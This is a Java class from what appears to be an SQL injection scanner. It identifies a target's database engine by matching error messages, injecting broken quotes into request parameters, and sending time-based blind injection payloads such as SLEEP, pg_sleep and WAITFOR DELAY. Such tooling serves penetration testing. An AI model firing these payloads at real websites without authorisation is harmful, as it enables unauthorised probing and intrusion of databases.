package com.vaccine.db;

import com.vaccine.core.ScanContext;
import com.vaccine.http.HttpClient;
import com.vaccine.http.HttpRequestSpec;
import com.vaccine.http.HttpResponseSnapshot;
import com.vaccine.model.Parameter;
import com.vaccine.model.Target;

import java.util.ArrayList;
import java.util.List;

// This service is responsible for fingerprinting the target DBMS
// by sending specific requests and analyzing responses.
// which means identifying the type of database (e.g., MySQL, PostgreSQL, Oracle, etc.)
// based on the behavior of the web application.
public class DbmsFingerprintingService {

    private final HttpClient httpClient;

    public DbmsFingerprintingService(HttpClient httpClient) {
        this.httpClient = httpClient;
    }

    public DbmsType detectDbms(ScanContext context) {
        Target target = context.getTarget();
        HttpResponseSnapshot baseline = context.getBaselineResponse();

        // 1) Try from baseline response (banners, stack traces, etc.)
        DbmsType fromBaseline = detectFromBody(baseline.getBody());
        if (fromBaseline != DbmsType.UNKNOWN) {
            return fromBaseline;
        }

        // 2) If we have parameters, try simple error-based injection
        List<Parameter> params = target.getParameters();
        if (!params.isEmpty()) {
            DbmsType fromError = detectByErrorInjection(target, params.getFirst());
            if (fromError != DbmsType.UNKNOWN) {
                return fromError;
            }

            // 3) Time-based probes as a fallback (stronger but slower)
            return detectByTimeProbes(target, params.getFirst(), baseline);
        }

        return DbmsType.UNKNOWN;
    }

    // ------------ 1. Error signatures in body ------------ //

    private DbmsType detectFromBody(String body) {
        if (body == null) return DbmsType.UNKNOWN;
        String lower = body.toLowerCase();

        // MySQL / MariaDB
        if (containsAny(lower,
                "you have an error in your sql syntax",
                "mysql server version for the right syntax",
                "mysqli",
                "mariadb server version"
        )) {
            return DbmsType.MYSQL;
        }

        // PostgreSQL
        if (containsAny(lower,
                "org.postgresql.util.psqlexception",
                "error: syntax error at or near",
                "postgresql",
                "pg_query(): query failed"
        )) {
            return DbmsType.POSTGRESQL;
        }

        // Microsoft SQL Server
        if (containsAny(lower,
                "microsoft sql server",
                "unclosed quotation mark after the character string",
                "incorrect syntax near",
                "sql server driver"
        )) {
            return DbmsType.MSSQL;
        }

        // Oracle
        if (containsAny(lower,
                "ora-00933", "ora-00936", "ora-00921", "ora-01756", "oracle error"
        )) {
            return DbmsType.ORACLE;
        }

        // SQLite
        if (containsAny(lower,
                "sqlite error", "sqliteexception", "sql logic error or missing database"
        )) {
            return DbmsType.SQLITE;
        }

        return DbmsType.UNKNOWN;
    }

    private boolean containsAny(String text, String... patterns) {
        for (String p : patterns) {
            if (text.contains(p)) return true;
        }
        return false;
    }

    // ------------ 2. Error-based injection fingerprinting ------------ //

    private DbmsType detectByErrorInjection(Target target, Parameter param) {
        // try some classic broken quote payloads
        String[] suffixes = {
                "'", "\"", "')", "\")"
        };

        for (String suffix : suffixes) {
            String payload = param.getValue() + suffix;
            HttpRequestSpec spec = target.toInjectedRequest(param, payload);
            HttpResponseSnapshot resp = httpClient.send(spec);

            DbmsType type = detectFromBody(resp.getBody());
            if (type != DbmsType.UNKNOWN) {
                return type;
            }
        }

        return DbmsType.UNKNOWN;
    }

    // ------------ 3. Time-based probes (SLEEP()) ------------ //

    private DbmsType detectByTimeProbes(Target target, Parameter param, HttpResponseSnapshot baseline) {
        long baselineTime = baseline.getResponseTimeMillis();
        long threshold = baselineTime + 2000; // ~2 seconds slower than baseline = suspect

        // We assume the parameter is used in a string context, so we inject something like: ' OR SLEEP(3)--
        List<TimeProbe> probes = new ArrayList<>();
        probes.add(new TimeProbe(
                DbmsType.MYSQL,
                "' OR SLEEP(3)-- "
        ));
        probes.add(new TimeProbe(
                DbmsType.POSTGRESQL,
                "'; SELECT pg_sleep(3);--"
        ));
        probes.add(new TimeProbe(
                DbmsType.MSSQL,
                "'; WAITFOR DELAY '0:0:3';--"
        ));
        probes.add(new TimeProbe(
                DbmsType.ORACLE,
                "' OR DBMS_LOCK.SLEEP(3) IS NULL --"
        ));
        probes.add(new TimeProbe(
                DbmsType.SQLITE,
                "'; SELECT randomblob(1000000000);--" // SQLite has no sleep(), this is a rough trick
        ));

        for (TimeProbe probe : probes) {
            String injected = param.getValue() + probe.payloadSuffix;
            HttpRequestSpec spec = target.toInjectedRequest(param, injected);
            HttpResponseSnapshot resp = httpClient.send(spec);

            long t = resp.getResponseTimeMillis();
            if (t >= threshold) {
                return probe.type;
            }
        }

        return DbmsType.UNKNOWN;
    }
}
